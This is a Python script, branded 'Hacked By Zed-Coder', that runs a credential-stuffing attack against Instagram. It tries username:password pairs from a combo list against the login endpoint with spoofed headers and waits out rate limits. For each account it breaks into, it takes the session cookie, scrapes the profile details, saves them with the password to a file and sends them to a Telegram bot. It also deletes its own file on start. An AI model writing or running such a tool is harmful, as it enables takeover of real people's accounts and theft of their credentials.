import requests, sys, os, random, time, user_agent
import os,sys
os.system('rm -rf .daxl1.py ;rm -rf /sdcard/download/.daxl1.py ;clear')
import subprocess
import json 
bad=0
hits=0
timeout=0
error=0
checkpoint=0
##################
os.system("clear")
wd = "\033[90;1m" 
GL = "\033[96;1m"
BB = "\033[34;1m"
YY = "\033[33;1m"
GG = "\033[32;1m"
WW = "\033[0;1m" 
RR = "\033[31;1m" 
CC = "\033[36;1m" 
B = "\033[34m"   
Y = "\033[33;1m"    
G = "\033[32m"    
W = "\033[0;1m" 
R = "\033[31m"  
logo1=G+'''
 ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
 ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
 ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
 ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
 ▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
 ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
             ░ ░   ░        ░      ░ ░           ░ 
'''+W+''' ---------------------------------------------------
'''+wd+''' ➣ Author   : Zed Coder
 ➣ GitHub   : https://github.com/968hacker
 ➣ YouTube  : Zed cracker
 ➣ telegram : https://t.me/zed_cracker_1
 '''+W+'''---------------------------------------------------'''
logo2=G+'''
 ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
 ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
 ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
 ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
 ▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
 ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
             ░ ░   ░        ░      ░ ░           ░ 
'''+W+''' ---------------------------------------------------
 '''+wd+'''➣ Author   : Zed Coder
 ➣ GitHub   : https://github.com/968hacker
 ➣ YouTube  : Zed cracker
 ➣ telegram : https://t.me/zed_cracker_1
'''+W+''' ---------------------------------------------------

'''+W+''' ---------------------------------------------------
 '''+wd+'''  Crack instgram it started !
    please wait .. 1h or 2h 
    Prosess in Background !...... 
'''+W+''' ---------------------------------------------------
 '''
print(logo1)
agar=input(" You Want To Bot TELEGRAM Your Results (y,yes or n,no) ")
if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
    ID=input(" Your ID Telegram :")
    token=input(" Token(bot) : ")
else:
    pass
print(W+' ---------------------------------------------------')
time.sleep(1)
for do in range(1):
    wd = "\033[90;1m" 
    GL = "\033[96;1m"
    BB = "\033[34;1m"
    YY = "\033[33;1m"
    GG = "\033[32;1m"
    WW = "\033[0;1m" 
    RR = "\033[31;1m" 
    CC = "\033[36;1m" 
    B = "\033[34m"   
    Y = "\033[33;1m"    
    G = "\033[32m"    
    W = "\033[0;1m" 
    R = "\033[31m"  
    sss="combo.txt"
    file=open(sss,"r").read().splitlines()
    for line in file:
        username_login = line.split(':')[0]
        password_login = line.split(':')[1]
        url_login = 'https://www.instagram.com/accounts/login/ajax/'
        headers_login = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '291','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': user_agent.generate_user_agent(),'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': '1cb44f68ffec','x-requested-with': 'XMLHttpRequest'}
        data_login = { 'username': username_login,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password_login}','queryParams': '{}','optIntoOneTap': 'false'}
        req_login = requests.post(url_login, data=data_login, headers=headers_login,verify=True)
        def sso():
            global bad,hits,checkpoint,timeout,error
            if '"message":"Please wait a few minutes before you try again."' in req_login.text:
                os.system("clear")
                print(logo2)
                timeout+=1
                print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'\n---------------------------------------------------',end='')
                time.sleep(350)
            elif ('"message":"checkpoint_required"') in req_login.text:
                os.system("clear")
                print(logo2)
                checkpoint+=1
                print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'\n---------------------------------------------------',end='')
            else:
                os.system("clear")
                print(logo2)
                error+=1
                print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'\n---------------------------------------------------',end='')
        if '"authenticated":false' in req_login.text:
            os.system("clear")
            print(logo2)
            bad+=1 
            print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'\n---------------------------------------------------',end='')
        elif '"authenticated":true' in req_login.text:
            os.system("clear")
            print(logo2)
            sessd = req_login.cookies['sessionid']
            for fi in range(1):
                url_checker = 'https://www.instagram.com/accounts/login/ajax/'
                headers_checker = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                    'content-length': '291',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
                    'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '1cb44f68ffec',
                    'x-requested-with': 'XMLHttpRequest'
                }
                data_checker = {
                    'username': "hjdhddddddhdhdhdhdhdhdhdhddhdhdhdhdhdhdhdhddhdhdhdhdhdhdhddhdhdhdhdhddhdhdhdhdhdhdhdhdh",
                    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1613414957:dsbvhdbvdsvbsdh',
                    'queryParams': '{}',
                    'optIntoOneTap': 'false'
                }
                req = requests.post(url_checker, data=data_checker, headers=headers_checker).text
                if '"user":false' in req:
                    url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
                    headers_get_info = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                        'cookie': f'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid={sessd}; rur=VLL',
                        'referer': 'https://www.instagram.com/accounts/edit/',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    data_get_info = {
                        '__a': '1'
                    }
                    req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
                    userakay = str(req_get_info.json()['form_data']['username'])
                    uy = str(req_get_info.json()['form_data']['first_name'])
                    url = f"https://www.instagram.com/{userakay}?hl=en"
                    r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
                    s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
                    soup = BeautifulSoup(r,'html.parser')
                    meta = soup.find("meta")
                    name = soup.find("meta", property="og:title")
                    name = name["content"].split("(")[0]
                    link_url = soup.find("meta", property="og:url")
                    profile_pic = soup.find("meta", property="og:image")
                    description = soup.find("meta", property="og:description")
                    followers = description["content"].split(",")[0]
                    following = description["content"].split(",")[1]
                    posts = description["content"].split(",")[2].split("-")[0]
                    s='''\n\n Hacked By Zed-Coder 😊💋\nNumber:'''+str(username_login)+'''\npass: '''+str(password_login)+'''\nUserName: '''+str(userakay)+'''\nName: '''+str(uy)+'''\nFollowers: '''+str(posts)+'''\nFollowing: '''+str(followers)+'''\nPosts: '''+str(following)+''' \nopen-facebook==Bypass'''
                    with open('/sdcard/Good.txt', 'a') as ff:
                        ff.write(str(s))
                    requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={s}\n')
                    hits+=1
                    print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'\n---------------------------------------------------',end='')
        else:
            sso()
